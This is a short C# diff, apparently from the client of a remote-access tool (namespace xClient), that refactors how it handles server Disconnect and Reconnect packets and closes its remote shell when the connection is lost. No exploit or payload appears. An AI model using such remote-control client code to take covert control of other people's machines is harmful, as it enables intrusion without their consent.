@@ -180,16 +180,33 @@ namespace xClient
                 goto HoldOpen;
         }
 
+        private static void Disconnect(bool reconnect = false)
+        {
+            if (reconnect)
+                CommandHandler.CloseShell();
+            else
+                SystemCore.Disconnect = true;
+            ConnectClient.Disconnect();
+        }
+
+        private static void LostConnection()
+        {
+            CommandHandler.CloseShell();
+        }
+
         private static void ClientState(Client client, bool connected)
         {
-            _connected = connected;
-
             if (connected && !SystemCore.Disconnect)
                 _reconnect = true;
             else if (!connected && SystemCore.Disconnect)
                 _reconnect = false;
             else
                 _reconnect = !SystemCore.Disconnect;
+
+            if (_connected != connected && !connected && _reconnect && !SystemCore.Disconnect)
+                LostConnection();
+
+            _connected = connected;
         }
 
         private static void ClientRead(Client client, IPacket packet)
@@ -211,14 +228,11 @@ namespace xClient
             }
             else if (type == typeof (Core.Packets.ServerPackets.Disconnect))
             {
-                CommandHandler.CloseShell();
-                SystemCore.Disconnect = true;
-                client.Disconnect();
+                Disconnect();
             }
             else if (type == typeof (Core.Packets.ServerPackets.Reconnect))
             {
-                CommandHandler.CloseShell();
-                client.Disconnect();
+                Disconnect(true);
             }
             else if (type == typeof (Core.Packets.ServerPackets.Uninstall))
             {
